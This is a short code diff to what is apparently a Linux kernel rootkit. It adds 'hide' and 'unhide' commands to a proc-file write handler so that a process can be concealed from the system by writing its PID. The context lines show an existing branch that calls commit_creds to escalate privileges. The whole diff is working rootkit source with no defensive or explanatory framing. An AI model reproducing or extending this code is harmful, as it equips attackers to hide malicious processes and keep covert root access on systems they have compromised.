@@ -31,6 +31,31 @@ static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t 
         }
         commit_creds(creds);
     }
+
+    else if (strncmp(ubuf, "hide", MIN(4, count)) == 0)
+    {
+        long pid;
+        char *pidstr = kmalloc(sizeof(char) * count - 4, GFP_KERNEL);
+
+        copy_from_user(pidstr, ubuf+4, count - 4);
+        kstrtol(pidstr, 10, &pid);
+        kfree(pidstr);
+
+        pr_info("hide %d\n", (pid_t) pid);
+        hide_proc(pid);
+    }
+    else if (strncmp(ubuf, "unhide", MIN(6, count)) == 0)
+    {
+        long pid;
+        char *pidstr = kmalloc(sizeof(char) * count - 6, GFP_KERNEL);
+
+        copy_from_user(pidstr, ubuf+6, count - 6);
+        kstrtol(pidstr, 10, &pid);
+        kfree(pidstr);
+
+        pr_info("unhide %d\n", (pid_t) pid);
+        unhide_proc(pid);
+    }
     return count;
 }
 
